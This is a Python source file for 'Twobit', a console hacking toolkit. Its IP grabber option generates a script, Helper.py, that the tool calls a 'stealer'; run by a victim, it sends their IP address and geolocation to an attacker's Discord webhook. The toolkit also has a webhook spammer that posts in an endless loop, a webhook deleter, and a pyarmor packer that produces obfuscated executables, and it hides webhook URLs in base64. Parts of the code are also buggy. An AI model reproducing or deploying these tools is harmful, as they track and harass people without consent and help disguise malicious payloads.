import os
import json
from random import randint, random
import urllib.request
import colorama
import requests
import time
import base64
import getpass
import itertools
import threading
import sys
import pyarmor

from dhooks import Webhook, Embed
from datetime import datetime
from colorama import Fore, Style
from time import sleep


# COLORS
cyan = Fore.CYAN
white = Fore.WHITE
red = Fore.RED
blue = Fore.BLUE
black = Fore.BLACK
green = Fore.GREEN
yellow = Fore.YELLOW
magenta = Fore.MAGENTA


#import update


THIS_VERSION = "4.7"

timess = datetime.now().strftime("%H:%M %p")  



def main():

    os.system('cls')
    def connect(host='http://google.com'):
        try:
            urllib.request.urlopen(host) #Python 3.x
            return True
        except:
            return False
    os.system('cls')
    if connect():
        print(Fore.GREEN + f"[!] You're connected to the internet!")
        time.sleep(2)
        os.system('cls')
        print(yellow + f"Booting to login ")
        time.sleep(.3)
        os.system('cls')
        print(yellow + f"Booting to login. . ")
        time.sleep(.3)
        os.system('cls')
        print(yellow + f"Booting to login. . .")
        time.sleep(.3)
        os.system('cls')
        print(yellow + f"Booting to login. . .")
        time.sleep(.6)
        os.system('cls')
        login()
    else:
        print(Fore.RED + f"[!] You're not connected to the internet!")
        time.sleep(3)
        quit()



banner = Fore.BLUE + Style.BRIGHT + f'''
                                    
                                ████████╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗████████╗
                                ╚══██╔══╝░██║░░██╗░░██║██╔══██╗██╔══██╗██║╚══██╔══╝
                                ░░░██║░░░░╚██╗████╗██╔╝██║░░██║██████╦╝██║░░░██║░░░
                                ░░░██║░░░░░████╔═████║░██║░░██║██╔══██╗██║░░░██║░░░
                                ░░░██║░░░░░╚██╔╝░╚██╔╝░╚█████╔╝██████╦╝██║░░░██║░░░
                                ░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░╚════╝░╚═════╝░╚═╝░░░╚═╝░░░
                                    By Vez Codez       v{THIS_VERSION} | {timess}
                                    https://github.com/VezCodes
    '''



def tool():
    os.system('cls')
    print(banner)
    #print(Fore.GREEN + f"Successfully loaded the tool!\nPlease wait for the first following update!")
    menu = Fore.LIGHTWHITE_EX + f'''
    {yellow}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        {Fore.CYAN}[{yellow}1{cyan}] {Fore.RED}Exit{Fore.LIGHTWHITE_EX}                |   {Fore.CYAN}[{yellow}5{cyan}] {Fore.LIGHTWHITE_EX}IP grabber
        {Fore.CYAN}[{yellow}2{cyan}] {Fore.LIGHTWHITE_EX}IP Lookup           |   {Fore.CYAN}[{yellow}6{cyan}] {Fore.LIGHTWHITE_EX}PY 2 EXE
        {Fore.CYAN}[{yellow}3{cyan}] {Fore.LIGHTWHITE_EX}Number Generator    |   {Fore.CYAN}[{yellow}7{cyan}] {Fore.LIGHTWHITE_EX}Support
        {Fore.CYAN}[{yellow}4{cyan}] {Fore.LIGHTWHITE_EX}Discord Tools       |   {Fore.CYAN}[{yellow}8{cyan}] {Fore.LIGHTWHITE_EX}Credits
    {yellow}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

    '''



# CREDITS MENU
    def credit():
        creditz = cyan + f'''
         {white}╔═╗╦═╗╔═╗╔╦╗╦╔╦╗╔═╗
         {cyan}║  ╠╦╝║╣  ║║║ ║ ╚═╗
         {blue}╚═╝╩╚═╚═╝═╩╝╩ ╩ ╚═╝ 

{green}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            {blue}* Twobit developed by Vez Codez
            {blue}* http://vezcodez.c1.biz
            {cyan}* https://github.com/vezcodes/about
            {cyan}* Sfyx#1222 (Discord)
            {white}* mo.z079 (Snapchat)
            {white}* mo.z079 (Instagram)
{green}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        '''
        os.system('cls')
        print(creditz)
        input(yellow + "[>>] Press [ ENTER ] to return :D")
        sleep(2)
        tool()

# PY2EXE
    def py2exe():
        os.system('cls')
        print(banner)
        print(" ")
        os.system("pip install -r requirements.txt")
        os.system('cls')
        print(banner)
        print(" ")
        print(cyan + f"[{yellow}>{cyan}] please provide the file name with extension. Example Main.py:")
        filename = input(cyan + f"[{yellow}>{cyan}]: ")
        sleep(1)
        os.system(f'pyarmor pack -e " --onefile" {filename}')
        os.system('cls')
        print(banner)
        input(green + f"Successfully converted {filename} to an encrypted executable in Folder DIST!\n{cyan}Press [ ENTER ] to return. . .")
        sleep(2)
        tool()


# IP GRABBER

    def ipgrabber():
        os.system('cls')
        print(banner)
        print(" ")
        webby = input(cyan+f"{yellow}[{green}>{yellow}] {cyan}Please enter the webhook to send the IP's to: ")

        text = '''
import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

time = datetime.now().strftime("%H:%M %p")  
ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
webby.send(embed=embed)'''
        text_file = open("Helper.py", "w")
        sleep(1)
        text_file.write(f'{text}')
        sleep(3)
        text_file.close()
        print(green + "Stealer has been created, it's named Helper.py")
        input(cyan + "[ ENTER ] to return. . .")
        sleep(1)
        tool()


# DISCORD-TOOLS
    def discordtools():
        os.system("cls")
        print(banner)
        dcmenu = Fore.LIGHTWHITE_EX + f'''
        {cyan}________________________________________________________________________________________________________________

        {Fore.CYAN}[{yellow}1{cyan}] {Fore.RED} {red}Back{white}               |   {Fore.CYAN}[{yellow}5{cyan}] {white} Show IP
        {Fore.CYAN}[{yellow}2{cyan}] {Fore.RED} {white}Webhook Spammer    |   {Fore.CYAN}[{yellow}6{cyan}] {white} Option 6
        {Fore.CYAN}[{yellow}3{cyan}] {Fore.RED} {white}Webhook Checker    |   {Fore.CYAN}[{yellow}7{cyan}] {white} Option 7
        {Fore.CYAN}[{yellow}4{cyan}] {Fore.RED} {white}Webhook Deleter    |   {Fore.CYAN}[{yellow}8{cyan}] {white} Option 8

        {cyan}________________________________________________________________________________________________________________
        
        '''

        os.system("cls")
        print(banner)
        print(dcmenu)
        

        dcchoice = int(input(cyan + "]>> Choice > "))

        if dcchoice == 1:
            print(green + "Returning to main menu in 3 seconds. . .")
            sleep(3)
            tool()
        
        elif dcchoice == 2:
            print(green + "Loading webhook spammer. . .")
            webhookspammer()
            sleep(3)


        elif dcchoice == 3:
            print(green + "Loading our Webhook Checker. . .")
            sleep(3)
            wbhookchecker()

        elif dcchoice == 4:
            print(green + "Loading our Webhook Deleter. . .")
            sleep(3)
            wbhookdel()

        elif dcchoice == 5:
            print(green + "Loading. . .")
            sleep(3)
            userip()
        else:
            print(red + "Invalid choice!")
            sleep(3)
            discordtools()
        discordtools()

# USER IP
    def userip():
        os.system('cls')
        print(banner)
        timesss = datetime.now().strftime("%H:%M %p")  
        ip = requests.get('https://api.ipify.org/').text

        r = requests.get(f'https://api.ipify.org/')
        geo = r.json()


        response = requests.post("http://ip-api.com/batch", json=[
            {'name': 'IP', 'value': geo['query']},
            {'name': 'ipType', 'value': geo['ipType']},
            {'name': 'Country', 'value': geo['country']},
            {'name': 'City', 'value': geo['city']},
            {'name': 'Continent', 'value': geo['continent']},
            {'name': 'Country', 'value': geo['country']},
            {'name': 'IPName', 'value': geo['ipName']},
            {'name': 'ISP', 'value': geo['isp']},
            {'name': 'Latitute', 'value': geo['lat']},
            {'name': 'Longitude', 'value': geo['lon']},
            {'name': 'Org', 'value': geo['org']},
            {'name': 'Region', 'value': geo['region']},
            {'name': 'Status', 'value': geo['status']},
        ]).json()

        print(response)
        input(yellow + "[>>] Press [ ENTER ] to return :D")
        sleep(1)
        tool()


# WEBHOOK DELETER
    def wbhookdel():
        os.system("cls")
        print(banner)
        start = input(cyan + "]>> Please enter the webhook to delete > ")

        b = requests.get(start)


        if b.status_code == 200:
            x = requests.delete(start)
            print(green + "[!] Successfully deleted the Webhook!\nPlease check it using the Webhook checker tool.")
            input(cyan + "]>> Press [ ENTER ] to return. . .")
            tool()
        elif b.status_code == 401:
            print(red + "[x] Couldn't delete webhook! The Webhook might be invalid!")
            input(cyan + "]>> Press [ ENTER ] to return. . .")
            tool()
        else:
            os.system("cls")
            print(banner)
            start = input(cyan + "]>> Please enter the webhook to delete > ")

# WEBHOOK CHECKER
    def wbhookchecker():
        os.system('cls')
        print(banner)
        webhoominputcheck = input(cyan + "]>> Please enter the webhook > ")

        r = requests.get(webhoominputcheck)
        y = r.json()  

        # print(r.status_code)

        if r.status_code == 200:
            print(green + "[!] Webhook is valid!")
            sleep(1)
            print(cyan + "]>> Press [ ENTER ] to return. . .")
            input()
            tool()
        elif r.status_code == 401:
            print(red + "[x] Webhook is invalid!")
            sleep(1)
            print(cyan + "]>> Press [ ENTER ] to return. . .")
            input()
            tool()
        # Coded at 28.01.2022
        # Succeeded at 11:59 AM
       
            
        

# WEBHOOK SPAMMER
    def webhookspammer():
        os.system('cls')
        print(banner)
        webhook = input("Please Insert WebHook URL: ")
        msg = input("Please Insert WebHook Spam Message: ")

        def spam(msg, webhook):
            while True:
                try:
                    data = requests.post(webhook, json={'content': msg})
                    print(cyan + "]>> Control + C to stop.")
                    if data.status_code == 204:
                        print(f"Message {msg} Sent!")
                except:
                    print("Bad Webhook :" + webhook)
                    time.sleep(2)
                    input("Press [ ENTER ] to return. . .")
                    tool()
        kingman_top = 1
        while kingman_top == 1:
            spam(msg, webhook)

# SUPPORT
    def support():
        surl = base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzkyODIyNDI4MzkxNjg5ODMzNC9YX3NHZXFHdkJ6OEJ3alFrUjZKSUJacl9oT080NWg4M0pOWTBMZWxUbm42UkU1bzhFSjJjQ3BvSjJBc1FacU8ydmZIVg==')

        os.system('cls')

        print(banner)

        dcusername = input(Fore.CYAN + f"]>> Please specify your Discord username / User#1234 > ")
        issue = input(Fore.CYAN + f"]>> Please specify the problem, and how we might solve it > ")

        if dcusername == "":
            print(Fore.RED + "[!] Please fill in your Discord username!")
            os.system('cls')
            support()

        elif dcusername != "":
            data = {"content": f'''@everyone new support opened\n```User:\n{dcusername}\n\nIssue:\n{issue}```'''}
            response = requests.post(surl, json=data)
            sleep(2)
            print(Fore.GREEN + "[!] Request has been sent!")
            sleep(2)
            os.system('cls')
            print(banner)
            print(" ")
            input('Press [ Enter ] to return. . .')
            print('Returning in 2 seconds. . .')
            sleep(2)
            tool()

        else:
            print(Fore.RED + f"An error occured. . .")
            sleep(3)
            quit()


# NUMBER GENERATOR
    def numbergen():
        os.system('cls')
        print(banner)

        value = randint(1, 1000)
        value2 = randint(1, 1000)

        print(f"Your generated number is: {value}")
        print(" ")

        yesorno1 = str(input(Fore.CYAN + "Do you want to generate again? Y/N > "))

        if yesorno1.upper() == 'Y':
            os.system('cls')
            print(banner)
            print(f"Your generated number is: {value2}")
            print(" ")
            input(Fore.CYAN + f"Press [ Enter ] to return. . .")
            tool()
        elif yesorno1.upper() == 'N':
            input(Fore.CYAN + f"Press [ Enter ] to return. . .")
            tool()
        else:
            print(Fore.RED + f"[!] An error occured. . .")
            time.sleep(2)
            tool()
        yesorno1 = input(Fore.CYAN + "Do you want to generate again? Y/N > ")
        #tool()
    
# IP-TOOL
    def iptool():
        os.system('cls')
        print(banner)
        ip = input("Ip address: ")

        response = requests.post("http://ip-api.com/batch", json=[
        {"query": ip}
        ]).json()


        for ip_info in response:
            for k,v in ip_info.items():
                print(k,v)
            print("\n")
        
        input(Fore.GREEN + f"Press [ Enter ] to return. . .")
        tool()

    print(menu)
    choice = int(input(Fore.YELLOW + "]>> Choice > "))
    if choice == 1:
        print(Fore.CYAN + f"Thank you for using our software!\nClosing in 3 seconds. . .")
        os.system('title Goodbye')
        time.sleep(3)
        quit()

    elif choice == 2:
        print(Fore.GREEN + f"Loading IP lookup tool. . .")
        time.sleep(2)
        iptool()

    elif choice == 3:
        print(Fore.GREEN + f"Loading Number Generator. . .")
        time.sleep(2)
        numbergen()
    
    elif choice == 4:
        print(Fore.GREEN + f"Loading our Discord Tools. . .")
        sleep(2)
        discordtools()

    elif choice == 5:
        print(Fore.GREEN + f"Loading our IP Grabber. . .")
        sleep(2)
        ipgrabber()

    elif choice == 6:
        print(Fore.GREEN + f"Loading our ENCRYPTED converter. . .")
        sleep(2)
        py2exe()

    elif choice == 7:
        print(Fore.GREEN + f"Loading our support form. . .")
        time.sleep(2)
        support()
    elif choice == 8:
        print(Fore.GREEN + f"Loading Credits Menu. . .")
        time.sleep(2)
        credit()



    else:
        print(Fore.RED + f"[!] Invalid option chosen.")
        time.sleep(2)
        os.system('cls')
        print(menu)   
        tool()
    print(menu)
    choice = int(input(Fore.YELLOW + "]>> Choice > "))

def login():
    timesss = datetime.now().strftime("%H:%M %p")  

    os.system('cls')
    print(banner)
    time.sleep(1)
    credentials = input(Fore.CYAN + f"]>> Please insert your personal ID to login, type register to sign-up > ")


    registerURL = base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzkyNzU4OTkwMDIxMDA0MDg0NC91bWRFTlhYZDdPTUVBNWRVWURvSTlld1ZLTWJpY2VhTGt4Y1dzc25BbnpieC1wSW9PZlpkOGdjTTBmWTdINU1NaEVqRQ==')
    url = base64.b64decode('aHR0cDovL3ZlemNvZGV6LmMxLmJpei9wcml2YXRlL2xvZ2luLmpzb24=')

    r = requests.get(url)

    y = r.json()  

    #print(y)
    
    while credentials != 'null':
        
        if credentials in y["ids"]:
            os.system(f'title Twobit by Vez Codez  v{THIS_VERSION}  User: {credentials}')
            password = getpass.getpass(Fore.CYAN + f"]>> Please insert your password to login > ")
            if password in y["passwords"]:

                print(Fore.GREEN + f"Successfully logged in as {credentials}\nContinuing in 3 seconds. . .")
                time.sleep(3)
                tool()

            else:
                print(Fore.RED + "[!] Invalid Password")
                time.sleep(2)
                os.system("cls")
                print(banner)
                print(Fore.CYAN + f"User ID: {credentials}")

        elif credentials not in y["ids"]:
            print(Fore.RED + f"ID {Fore.LIGHTWHITE_EX}{credentials}{Fore.RED} not found!")
            sleep(2)
            os.system("cls")
            login()
        
        elif credentials == "register" or "Register":
            os.system("cls")
            print(banner)
            print(Fore.LIGHTYELLOW_EX + f"1. Insert your gamer tag, example: vez\n2. Insert your password after your gamer tag with an At Sign @\nExample: vez@mypassword\n[!] NO CAPITAL LETTERS!!")
            print(" ")
            register = input(Fore.YELLOW + f"]>> Please enter your personal login ID and password as shown above > ")

            if register == " ":
                print(Fore.RED + f"[!] Can not send a empty request. . .\n{Fore.GREEN}Returning back to main menu. . .")
                time.sleep(3)
                os.system('cls')
                login()
            else:
                print(Fore.RED + f"[!] Can not send a empty request. . .\n{Fore.GREEN}Returning back to main menu. . .")
                sleep(3)
                os.system('cls')
                login()
            
            print(banner)
            register = input(Fore.YELLOW + f"]>> Please enter your personal login ID and password as shown above > ")
            
            data = {"content": f'''@everyone new sign-up request: `{register}`'''}
            response = requests.post(registerURL, json=data)

            if response.status_code != 200:
                print(Fore.RED + "You don't have a internet connection or an error occured.\nPlease try again.")
                time.sleep(3)
                quit()
            else:
                print("Successfully sent request!\nThis process can take up to 6 hours, so be patient!\nClosing in 3 seconds. . .")
                time.sleep(3)
                quit()


        else:
            print(Fore.RED + "[!] Invalid ID or Command")
            time.sleep(2)
            os.system("cls")
            print(banner)
            credentials = input(Fore.CYAN + f"]>> Please insert your personal ID to login, or type register to sign-up > ")
    print(banner)
    credentials = input(Fore.CYAN + f"]>> Please insert your personal ID to login, or type register to sign-up > ")

done = False

def animate():
    os.system('cls')
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write(cyan + '\rLoading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(3)
done = True
main()


if __name__ == '__main__':
    main()